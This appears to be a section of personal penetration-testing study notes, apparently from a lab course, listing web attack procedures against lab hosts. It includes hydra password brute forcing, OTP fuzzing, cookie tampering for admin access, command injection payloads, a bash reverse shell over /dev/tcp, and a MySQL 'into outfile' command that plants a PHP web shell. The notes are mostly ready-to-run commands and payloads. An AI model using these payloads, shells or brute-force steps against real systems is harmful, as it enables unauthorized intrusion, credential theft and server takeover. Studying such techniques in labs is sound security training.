## 6. COMMON ATTACKS

### 6.1. HTTP method tampering

- **Actions**:
  - Directory brute force → dirb ```url```
  - Get with curl → curl -v ```url```
  - Select method with curl → curl -v -X POST ```url```
  - Select method with curl and data → curl -v -X POST -d "name=test&password=pass" ```url```

### 6.2. Attacking basic HTTP authentication

- **Automation of attack with Intruder**:
  1. Send to repeater
  2. Select the base64 value
  3. Payload → load list
  4. Configure payload process rules → add prefix → ```username:```
  5. Add → encode → base64
  6. Separate into different variables if want to address also username

### 6.3. Attacking HTTP Digest Authentication

1. Command → ```hydra -l admin -P /root/Desktop/wordlists/100-common-passwords.txt 192.152.221.3 http-get /digest/```

### 6.4. Sensitive data exposure

1. Directory brute force → ```dirb [url] [wordlist]```
2. Listing directory enabled. Use nikto → ```nikto -h [url]```

### 6.5. Attacking login forms with OTP security

 1. Intercept the request with Burp Suite
 2. Forward requests until hitting the POST request: ```/dev/verify```
 3. Send to repeater
 4. Check session ID changes on each request
 5. Use OWASP ZAP intruder (no restrictions on rate limiting)
 6. Open OWASP ZAP browser
 7. Left panel → browse the endpoint → right click → fuzz
 8. Specify position → add → numbers → 1000 to 9999
 9. Filter result in Message Processor tab → ```.*failed*``` → tab name 'Field'
 10. Start fuzzer

### 6.6. Session hijacking via cookie tampering

1. You are presented with a form
2. Enter credentials and intercept it with BS
3. Check the response in http history → session id is in base64
4. Decoder → decode base64
5. Encode admin to true and modify request
6. Check the port and url you're sending the POST request. If not working try from BS

### 6.7. Advanced electron forum CSRF

1. CLI to search for exploits → ```searchsploit "Advanced Electron Forum"```
2. When copying → paste the path with this prefix: ```usr/share/exploitdb/exploits/php/webapps/whatever.txt```
3. Check the html payload. Copy it.
4. Change the url in the form. Save it in the desktop
5. Change the name of the database
6. Double click on the html and it'll execute. 

#### 6.8. Command injection

1. Intercept the request with burp suite. 
2. First it comes an OPTIONS request, then POST
3. Desktop/wordlists/txt. Upload the file
4. Check the payload. It has two fields: file and data.
5. Inject a command in field file
  -  ```100-common-passwords.txt; whoami```
  -  ```100-common-passwords.txt; id```
6. Open a listener with ncat
  - ```nc -nvlp 4444```
7. Then try to inject and connect to check the blind injection: 
  - ```nc [ip] 4444```
8. Same process can be done in the other direction with a remote shell:
  - ```bash -c 'bash -i >&/dev/tcp/[ip]/4444 0>&1'```
9. Check underlying server version: ```cat /etc/*issue```

#### 6.9. PHP code injection

1. Identify the target web app address → ```ifconfig```
2. Access and select php code attack
3. Craft the attack into the url → ```test;phpinfo()```
4. Other examples
    - System commands → ```system keyword + command in parenthesis```
    
#### 6.10. Attack server misconfiguration through a MySQl vulnerability

1. Access the web app on the .3 local ip
2. Perform an nmap scan → ```sudo nmap -sS -sV --script mysql-empty-password -p 3306 [ip]```
3. Access non protected database
  - ```mysql -u root -h [ip]```
  - ```show databases```
4. Check writing operations → ```select 'Hello World' into outfile '/tmp/test' from mysql.user limit 1```
5. Do a RCE with php → ```select '<?php $output=shell_exec($_GET["cmd"]);echo "<pre>".$output."</pre>"?>' into outfile '/var/www/html/shell.php' from mysql.user limit 1;```